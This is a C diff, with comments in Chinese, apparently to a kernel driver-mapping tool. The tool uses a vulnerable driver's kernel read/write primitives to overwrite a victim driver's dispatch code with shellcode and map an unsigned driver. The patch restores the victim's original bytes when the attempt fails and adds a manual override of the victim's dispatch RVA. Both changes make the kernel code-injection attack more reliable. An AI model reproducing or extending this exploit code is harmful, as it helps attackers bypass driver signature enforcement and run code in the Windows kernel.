@@ -900,6 +900,19 @@ BOOL KDUpMapDriverDirectVM(
     KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
     HANDLE victimDeviceHandle = NULL;
 
+    /*
+     * 先把要被覆盖的原始字节读出来。stager 没能接管控制权时（例如 2 秒内没有信号），
+     * victim 的创建路径会继续往下执行，撞上被覆盖的邻居函数就是在内核里 AV/UD 蓝屏。
+     * 保留原始字节并在失败路径写回去，可以把"蓝屏"降级成"干净失败"。
+     */
+    PVOID originalBytes = supHeapAlloc(ScSize);
+    BOOL haveOriginal = FALSE;
+
+    if (originalBytes &&
+        prov->Callbacks.ReadKernelVM(Context->DeviceHandle, TargetAddress, originalBytes, ScSize)) {
+        haveOriginal = TRUE;
+    }
+
     //
     // Write shellcode to the cave (or straight to the entry when no cave was found).
     //
@@ -995,6 +1008,26 @@ BOOL KDUpMapDriverDirectVM(
     }
 
     //
+    // 失败时把 victim 的原始字节写回去，避免创建路径继续执行到被覆盖的邻居函数。
+    //
+    if (!bSuccess && haveOriginal) {
+
+        if (prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
+            TargetAddress,
+            originalBytes,
+            ScSize))
+        {
+            printf_s("[+] Victim bytes restored after failure\r\n");
+        }
+        else {
+            supPrintfEvent(kduEventError,
+                "[!] Could not restore victim bytes, expect instability\r\n");
+        }
+    }
+
+    if (originalBytes) supHeapFree(originalBytes);
+
+    //
     // Ensure victim handle is closed.
     //
     if (victimDeviceHandle) {
@@ -1068,6 +1101,27 @@ BOOL KDUMapDriver(
             sizeof(vi)))
         {
             dispatchOffset = vi.DispatchOffset;
+
+            /*
+             * 可选：直接用调用方给出的派发 RVA 覆盖签名匹配结果。
+             *
+             * 签名匹配的是"函数特征字节"，victim 换版本后它会命中别的函数；那时 stager
+             * 被写到错误位置，打开设备时执行的是未被跳转覆盖的路径，却撞上被覆盖的邻居
+             * 函数，表现为 victim 内 #UD/#DE。用真实的 IRP_MJ_CREATE 派发 RVA 可以避开
+             * 这个猜测（victim-scout 工具负责算出这个值）。
+             */
+            if (Context->ArbitraryData != 0) {
+
+                ULONG override_rva = (ULONG)Context->ArbitraryData;
+
+                printf_s("[+] Victim dispatch RVA override: 0x%lX (signature said 0x%lX)\r\n",
+                    override_rva,
+                    dispatchOffset);
+
+                dispatchOffset = override_rva;
+                vi.DispatchOffset = override_rva;
+                vi.DispatchPageOffset = override_rva & 0xfff;
+            }
 
             RtlSecureZeroMemory(&vdi, sizeof(vdi));
 
